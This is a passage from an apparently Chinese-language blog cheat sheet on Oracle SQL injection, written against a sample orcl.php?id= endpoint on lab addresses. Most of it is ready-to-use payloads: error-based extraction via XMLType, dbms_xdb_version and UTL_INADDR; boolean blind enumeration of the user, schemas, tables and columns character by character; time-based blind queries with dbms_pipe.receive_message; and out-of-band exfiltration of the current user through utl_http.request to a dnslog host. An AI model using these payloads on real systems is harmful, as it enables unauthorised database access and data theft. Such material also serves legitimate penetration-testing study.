<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">XMLType是oracle系统定义的数据类型，系统预定义了内部函数去访问XML数据</span><br><span class="line"><span class="keyword">select</span> XMLType(<span class="string">&#x27;&lt;:&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)<span class="operator">||</span><span class="string">&#x27;&gt;&#x27;</span>) <span class="keyword">from</span> dual;</span><br><span class="line">PS：调用的时候必须以<span class="operator">&lt;</span>:开头和<span class="operator">&gt;</span>结尾，即 <span class="string">&#x27;&lt;:&#x27;</span><span class="operator">||</span>balabala<span class="operator">||</span><span class="string">&#x27;&gt;&#x27;</span> 或者 chr(<span class="number">60</span>)<span class="operator">||</span>balabal<span class="operator">||</span>chr(<span class="number">62</span>）;如果返回的数据种有空格的话，会自动截断，导致数据不完整，这种情况下需要先转为 hex，再导出(或者有replace函数替换成其他非空字符)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>dbms_xdb_version.checkin</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> dbms_xdb_version.checkin(   PAYLOAD位置  ) <span class="keyword">FROM</span> DUAL) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>


<ul>
<li><strong>dbms_xdb_version.makeversioned</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">select</span> dbms_xdb_version.makeversioned( PAYLOAD位置 ) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> </span><br></pre></td></tr></table></figure>


<ul>
<li><strong>dbms_xdb_version.uncheckout</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> dbms_xdb_version.uncheckout(   PAYLOAD位置  ) <span class="keyword">FROM</span> DUAL) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>dbms_utility.sqlid_to_sqlhash</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> dbms_utility.sqlid_to_sqlhash(  PAYLOAD位置  ) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span></span><br></pre></td></tr></table></figure>


<ul>
<li><strong>UTL_INADDR.get_host_name</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> UTL_INADDR.get_host_name((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>


<ul>
<li><strong>UTL_INADDR.get_host_address</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> UTL_INADDR.get_host_name(<span class="string">&#x27;~&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)<span class="operator">||</span><span class="string">&#x27;~&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>ordsys.ord_dicom.getmappingxpath</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ordsys.ord_dicom.getmappingxpath( PAYLOAD位置 ,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">1</span> </span><br></pre></td></tr></table></figure>

<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>1.判断注入</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">172.16</span><span class="number">.12</span><span class="number">.2</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; &quot; and 1=1 and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>2.查询数据库版本/用户</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decode decode(substr((<span class="string">&#x27;abc&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p><strong>length</strong> 返回字符串长度<br><strong>ascii</strong>  返回字符的ascii码<br><strong>instr</strong>  搜索指定结果内是否包含关键字 存在返回1 否则返回0</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> decode(substr((<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;O&#x27;</span>,<span class="number">1</span>,<span class="number">0</span>) <span class="keyword">from</span> dual)<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(<span class="keyword">user</span>) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">4</span><span class="comment">-- </span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(<span class="string">&#x27;a&#x27;</span>) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">97</span><span class="comment">-- </span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">84</span><span class="comment">-- #ascii码判断字符 T</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">69</span><span class="comment">-- #ascii码判断字符 E</span></span><br></pre></td></tr></table></figure>

<p><strong>3.instr</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;T&#x27;</span>))<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;TE&#x27;</span>))<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;TES&#x27;</span>))<span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(instr((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual),<span class="string">&#x27;TEST&#x27;</span>))<span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><strong>4.获取库名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#子查询语句法:</span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span>(OWNER)) <span class="keyword">FROM</span> SYS.ALL_TABLES)<span class="operator">=</span><span class="number">19</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> LENGTH(OWNER) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">&gt;</span><span class="number">3</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> LENGTH(OWNER) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">=</span><span class="number">11</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> ASCII(SUBSTR(OWNER,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">&gt;</span><span class="number">10</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> ASCII(SUBSTR(OWNER,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> OWNER,ROWNUM <span class="keyword">AS</span> LIMIT <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(OWNER) <span class="keyword">FROM</span> SYS.ALL_TABLES)) <span class="keyword">WHERE</span> LIMIT <span class="operator">=</span> <span class="number">1</span>)<span class="operator">=</span><span class="number">65</span></span><br><span class="line"></span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">#普通方法</span><br><span class="line"></span><br><span class="line">#判断 数据库数量</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">AND</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="keyword">distinct</span>(owner)) <span class="keyword">from</span> all_tables)<span class="operator">=</span><span class="number">19</span></span><br><span class="line">#判断 库名长度</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(owner) <span class="keyword">from</span> all_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>)<span class="operator">&gt;</span><span class="number">10</span></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(OWNER) <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> OWNER <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;SYS&#x27;</span>,<span class="string">&#x27;SYSTEM&#x27;</span>,<span class="string">&#x27;OUTLN&#x27;</span>,<span class="string">&#x27;GSMADMIN_INTERNAL&#x27;</span>) <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span>) <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span>)<span class="operator">=</span><span class="number">9</span></span><br><span class="line">#跑库名</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span> </span><br><span class="line">#跑出第一个库名 为sys后</span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;sys&#x27;</span>) <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line">#跑出第二个库名为 <span class="keyword">SYSTEM</span></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> owner <span class="keyword">from</span> all_tables <span class="keyword">where</span> owner <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;sys&#x27;</span>,<span class="string">&#x27;SYSTEM&#x27;</span>) <span class="keyword">and</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"></span><br><span class="line">....继续跑</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>5.获取表名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>)),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"></span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"> </span><br><span class="line">orcl.php?id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables <span class="keyword">WHERE</span> owner<span class="operator">=</span> <span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> table_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ADMIN&#x27;</span>,<span class="string">&#x27;USER&#x27;</span>)),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>6.获取字段名</strong><br>_</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">117</span><span class="comment">-- 跑ADMIN表内的第一个字段</span></span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>)) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">115</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">....继续跑 下一个表</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>_</p>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> 条件 <span class="keyword">THEN</span> 执行语句 <span class="keyword">END</span> xxx dbms_pipe.receive_message((), <span class="number">5</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> decode(substr((<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$version <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>),<span class="string">&#x27;O&#x27;</span>, dbms_pipe.receive_message(<span class="string">&#x27;ICQ&#x27;</span>, <span class="number">5</span>),<span class="number">0</span>) <span class="keyword">from</span> dual)<span class="operator">=</span><span class="number">1</span><span class="comment">--截取数据库版本第一个字符为O就延时5s</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> decode(length(<span class="keyword">user</span>),<span class="number">4</span>,dbms_pipe.receive_message(<span class="string">&#x27;ICQ&#x27;</span>, <span class="number">5</span>),<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br><span class="line">用户名长度为<span class="number">4</span> 就延时<span class="number">5</span>s</span><br><span class="line"># 使用延时函数</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> dbms_pipe.receive_message(<span class="string">&#x27;123&#x27;</span>,<span class="number">10</span>)</span><br><span class="line"># 使用条件语句</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> 条件 <span class="keyword">THEN</span> 执行语句 <span class="keyword">END</span> xxx</span><br><span class="line">#组成.条件成立执行延时<span class="number">10</span>S,并返回<span class="literal">true</span>,否返回<span class="literal">false</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">THEN</span> dbms_pipe.receive_message(<span class="string">&#x27;123&#x27;</span>,<span class="number">10</span>) <span class="keyword">END</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"># 注入语句:</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">when</span> (ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">1</span> <span class="keyword">THEN</span> dbms_pipe.receive_message(<span class="string">&#x27;123&#x27;</span>,<span class="number">5</span>) <span class="keyword">END</span> <span class="number">123</span> <span class="keyword">from</span> dual</span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (ascii(substr((<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> owner <span class="operator">=</span><span class="string">&#x27;TEST&#x27;</span> <span class="keyword">AND</span> table_name <span class="operator">=</span><span class="string">&#x27;ADMIN&#x27;</span> <span class="keyword">AND</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> column_name <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">&#x27;ID&#x27;</span>,<span class="string">&#x27;NAME&#x27;</span>)),<span class="number">2</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">100</span> <span class="keyword">THEN</span> DBMS_PIPE.RECEIVE_MESSAGE(<span class="number">123</span>, <span class="number">5</span>) <span class="keyword">ELSE</span> <span class="number">1</span> <span class="keyword">END</span>)<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="带外查询"><a href="#带外查询" class="headerlink" title="带外查询"></a>带外查询</h3><p>所以使用OOB需要有发起网络请求的权限</p>
<ul>
<li><strong>utl_http.request</strong></li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name<span class="operator">=</span><span class="string">&#x27;UTL_HTTP&#x27;</span>)<span class="operator">&gt;</span><span class="number">1</span><span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.172</span><span class="number">.146</span>:<span class="number">81</span><span class="operator">/</span>orcl.php?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">null</span>,<span class="number">3</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name<span class="operator">=</span><span class="string">&#x27;UTL_HTTP&#x27;</span>) <span class="keyword">from</span> dual<span class="comment">-- #判断utl_http是否可用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">utl_http.request向外网主机发送http请求，需要出外网http</span><br><span class="line"><span class="keyword">select</span> utl_http.request(<span class="string">&#x27;dnslog&#x27;</span><span class="operator">||</span>(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<h2 id="Oracle-外带"><a href="#Oracle-外带" class="headerlink" title="Oracle 外带"></a>Oracle 外带</h2><p>需要网络访问权限</p>
